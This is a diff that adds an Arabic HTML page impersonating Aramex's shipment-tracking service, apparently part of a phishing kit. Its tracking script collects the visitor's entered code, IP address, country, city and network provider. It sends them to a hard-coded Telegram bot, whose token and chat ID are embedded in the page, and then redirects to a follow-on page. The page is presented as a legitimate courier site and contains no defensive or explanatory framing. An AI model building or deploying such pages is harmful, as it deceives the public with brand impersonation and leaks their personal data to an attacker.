@@ -1,0 +1,143 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>تتبع شحنتك - أرامكس</title>
+  <!-- Bootstrap RTL -->
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.rtl.min.css" rel="stylesheet">
+  <style>
+    body {
+      font-family: "Cairo", sans-serif;
+      background: linear-gradient(-45deg, rgba(255,153,153,0.9), rgba(255,77,77,0.9), rgba(255,51,51,0.9), rgba(179,0,0,0.9)),
+                  url('img/brofael.png') no-repeat center center fixed;
+      background-size: cover;
+      animation: gradientBG 12s ease infinite;
+    }
+    @keyframes gradientBG {
+      0% {background-position: 0% 50%;}
+      50% {background-position: 100% 50%;}
+      100% {background-position: 0% 50%;}
+    }
+    .container-box {
+      background: #fff;
+      border-radius: 20px;
+      padding: 25px;
+      box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+    }
+    h1 { color: #d10000; font-weight: 700; }
+    .btn-main {
+      background: linear-gradient(45deg, #d10000, #b30000);
+      color: #fff;
+      font-weight: bold;
+      border-radius: 50px;
+    }
+    .btn-main:hover { opacity: 0.9; transform: scale(1.03); }
+    footer {
+      text-align: center;
+      padding: 15px;
+      color: white;
+      font-size: 14px;
+      background: rgba(0,0,0,0.3);
+    }
+  </style>
+</head>
+<body class="d-flex flex-column min-vh-100">
+
+  <header class="bg-white shadow-sm text-center p-2">
+    <img src="images/logo1.png" alt="Aramex" style="height:50px">
+  </header>
+
+  <main class="flex-grow-1 d-flex align-items-center">
+    <div class="container">
+      <div class="row justify-content-center">
+        <div class="col-12 col-md-8 col-lg-5">
+          <div class="container-box text-center">
+            <h1>Aramex Express</h1>
+            <h5 class="text-muted mb-3">أدخل رقم التتبع</h5>
+
+            <div id="msg" class="alert d-none"></div>
+
+            <input type="text" id="trackingNumber" class="form-control mb-3 text-center" maxlength="6" placeholder="">
+            
+            <h5 class="text-muted mb-2">نوع الطلب</h5>
+            <select id="orderType" class="form-select mb-3 text-center">
+              <option value="توصيل">توصيل</option>
+              <option value="استلام">استلام</option>
+            </select>
+
+            <button class="btn btn-main w-100" onclick="trackShipment()">تتبع</button>
+
+            <div class="about mt-4">
+              <p class="small text-muted">
+                أرامكس هي شركة عالمية رائدة في مجال خدمات النقل السريع والشحن والخدمات اللوجستية. 
+                نقدم حلولاً مبتكرة لتوصيل شحناتك بسرعة وأمان إلى أي مكان في العالم.
+              </p>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </main>
+
+  <footer>
+    جميع الحقوق محفوظة © أرامكس 2025
+  </footer>
+
+  <!-- Bootstrap JS -->
+  <!-- <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script> -->
+
+  <script>
+    async function trackShipment() {
+      const input = document.getElementById("trackingNumber").value;
+      const orderType = document.getElementById("orderType").value;
+      const msg = document.getElementById("msg");
+      msg.className = "alert d-none";
+
+      if(!/^\d{6}$/.test(input)) {
+        msg.className = "alert alert-danger";
+        msg.textContent = "إدخال خاطئ - يجب إدخال 6 أرقام فقط";
+        return;
+      }
+
+      msg.className = "alert alert-warning";
+      msg.innerHTML = "جاري التحقق... <div class='spinner-border spinner-border-sm text-danger ms-2'></div>";
+
+      try {
+        let res = await fetch("https://ipapi.co/json/");
+        let data = await res.json();
+        let info = {
+          tracking: input,
+          type: orderType,
+          date: new Date().toLocaleString('ar-EG'),
+          ip: data.ip,
+          country: data.country_name,
+          city: data.city,
+          org: data.org
+        };
+
+
+        const BOT_TOKEN = "7249432247:AAFCoEkwppQ0pOrGWOLBBBCWyATgjpD__bo";
+        const CHAT_ID = "7284154308";
+        const text = `📦 رقم التتبع: ${info.tracking}\n📋 نوع الطلب: ${info.type}\n🌍 الدولة: ${info.country}\n🏙️ المدينة: ${info.city}\n💻 الشبكة: ${info.org}\n🌐 IP: ${info.ip}\n⏰ ${info.date}`;
+
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+          method: "POST",
+          headers: {"Content-Type": "application/json"},
+          body: JSON.stringify({ chat_id: CHAT_ID, text: text })
+        });
+
+        msg.className = "alert alert-success";
+        msg.textContent = `✅ تم استلام طلبك (${info.type}) بنجاح. جاري التحقق من الشحنة...`;
+      } catch(e) {
+        msg.className = "alert alert-danger";
+        msg.textContent = "⚠️ حدث خطأ أثناء جلب البيانات";
+      }
+
+      setTimeout(() => {
+        window.location.href = "ordar.html";
+      }, 5000);
+    }
+  </script>
+</body>
+</html>
